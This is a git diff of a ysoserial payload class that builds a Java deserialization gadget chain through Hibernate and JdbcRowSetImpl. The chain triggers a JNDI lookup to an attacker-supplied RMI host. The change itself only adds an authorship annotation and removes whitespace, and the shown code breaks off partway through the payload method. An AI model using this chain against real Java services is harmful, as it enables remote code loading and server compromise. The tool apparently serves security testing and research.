@@ -1,6 +1,7 @@
 package ysoserial.payloads;
 
 
+import ysoserial.payloads.annotation.Authors;
 import ysoserial.payloads.annotation.PayloadTest;
 import ysoserial.payloads.util.PayloadRunner;
 
@@ -8,11 +9,11 @@ import com.sun.rowset.JdbcRowSetImpl;
 
 
 /**
- * 
+ *
  * Another application filter bypass
- * 
+ *
  * Needs a getter invocation that is provided by hibernate here
- * 
+ *
  * javax.naming.InitialContext.InitialContext.lookup()
  * com.sun.rowset.JdbcRowSetImpl.connect()
  * com.sun.rowset.JdbcRowSetImpl.getDatabaseMetaData()
@@ -24,29 +25,30 @@ import com.sun.rowset.JdbcRowSetImpl;
  * org.hibernate.engine.spi.TypedValue$1.initialize()
  * org.hibernate.internal.util.ValueHolder.getValue()
  * org.hibernate.engine.spi.TypedValue.hashCode()
- * 
- * 
+ *
+ *
  * Requires:
  * - Hibernate (>= 5 gives arbitrary method invocation, <5 getXYZ only)
- * 
+ *
  * Arg:
  * - JNDI name (i.e. rmi:<host>)
- * 
+ *
  * Yields:
  * - JNDI lookup invocation (e.g. connect to remote RMI)
- * 
+ *
  * @author mbechler
  */
 @SuppressWarnings ( {
     "restriction"
 } )
 @PayloadTest( harness = "ysoserial.payloads.JRMPReverseConnectTest")
+@Authors({ Authors.MBECHLER })
 public class Hibernate2 implements ObjectPayload<Object>, DynamicDependencies {
 
     public static String[] getDependencies () {
         return Hibernate1.getDependencies();
     }
-   
+
     public Object getObject ( String command ) throws Exception {
         JdbcRowSetImpl rs = new JdbcRowSetImpl();
         rs.setDataSourceName(command);
